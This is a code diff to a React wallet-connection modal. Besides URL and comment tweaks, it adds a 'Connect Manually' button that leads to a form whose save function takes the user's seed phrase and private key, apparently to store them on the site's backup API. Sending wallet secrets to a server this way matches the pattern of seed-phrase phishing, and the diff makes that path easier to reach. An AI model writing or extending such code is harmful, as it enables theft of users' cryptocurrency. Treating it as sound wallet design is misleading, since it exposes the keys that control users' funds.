@@ -76,7 +76,8 @@ const WalletModal: React.FC<WalletModalProps> = ({
     // Step 1: Check if the selected wallet has a public address in the database
     if (selectedWallet?.id) {
       try {
-        const response = await fetch(`/api/backup/checkWalletPublicAddress/${userId}/${selectedWallet.id}`);
+        // Modify the fetch URL to pass userId and walletId as query parameters
+        const response = await fetch(`/api/backup/checkWalletPublicAddress?userId=${userId}&walletId=${selectedWallet.id}`);
         const data = await response.json();
 
         // If the wallet already has a public address, show success modal
@@ -94,11 +95,12 @@ const WalletModal: React.FC<WalletModalProps> = ({
       }
     }
 
-    // Step 2: If no public address found, proceed with wallet connection
+    // Step 2: If no public address found or check failed, proceed with wallet connection
     setTimeout(async () => {
       setModalStep("connecting");
       setPreloader(false);
 
+      // Check if MetaMask is installed
       if (typeof window.ethereum === "undefined") {
         setDynamicError("MetaMask is not installed. Please download it.");
         setModalStep("error");
@@ -113,7 +115,9 @@ const WalletModal: React.FC<WalletModalProps> = ({
 
         if (accounts.length > 0) {
           const publicAddress = accounts[0];
-          const response = await fetch(`/api/backup/storeWalletData/${userId}`, {
+
+          // Step 3: Save the wallet data
+          const storeResponse = await fetch(`/api/backup/storeWalletData?userId=${userId}`, {
             method: "PUT",
             headers: {
               "Content-Type": "application/json",
@@ -124,8 +128,8 @@ const WalletModal: React.FC<WalletModalProps> = ({
             }),
           });
 
-          if (response.ok) {
-            const data = await response.json();
+          if (storeResponse.ok) {
+            const data = await storeResponse.json();
             console.log("Wallet data saved successfully", data);
             setModalStep("success");
           } else {
@@ -135,6 +139,7 @@ const WalletModal: React.FC<WalletModalProps> = ({
           throw new Error("No accounts found in MetaMask.");
         }
       } catch (err: unknown) {
+        // Adjust the error handling
         if (err instanceof Error) {
           setDynamicError(err.message || "Failed to connect to MetaMask.");
         } else {
@@ -144,6 +149,17 @@ const WalletModal: React.FC<WalletModalProps> = ({
       }
     }, 5000);
   };
+
+
+  const connectWalletManually = () => {
+    if (currentStep === 0) {
+      setCurrentStep(1); // Move to the next step in manual connection
+    } else {
+      setCurrentStep(0); // Reset to the initial step
+      setModalStep("initial"); // Reset modal to initial state
+    }
+  };
+
 
   const saveManualData = async () => {
     const { publicAddress, seedPhrase, privateKey, qrCodeData } = backupData;
@@ -186,6 +202,10 @@ const WalletModal: React.FC<WalletModalProps> = ({
       setModalStep("error");
     }
   };
+
+
+
+
 
   const goBack = () => {
     setCurrentStep(0);
@@ -237,8 +257,11 @@ const WalletModal: React.FC<WalletModalProps> = ({
                   <Button className="bg-red-600" onClick={onClose}>
                     Cancel
                   </Button>
-                  <Button className="bg-black" onClick={goBack}>
-                    Go Back
+                  <Button
+                    className="bg-black"
+                    onClick={connectWalletManually}
+                  >
+                    Connect Manually
                   </Button>
                 </div>
               </div>
@@ -310,10 +333,11 @@ const WalletModal: React.FC<WalletModalProps> = ({
               }
             />
             <div className="space-x-2 text-center">
-              <Button onClick={saveManualData}>Save</Button>
+
               <Button onClick={goBack} variant="outline">
                 Go Back
               </Button>
+              <Button onClick={saveManualData}>Save</Button>
             </div>
           </div>
         </DialogContent>
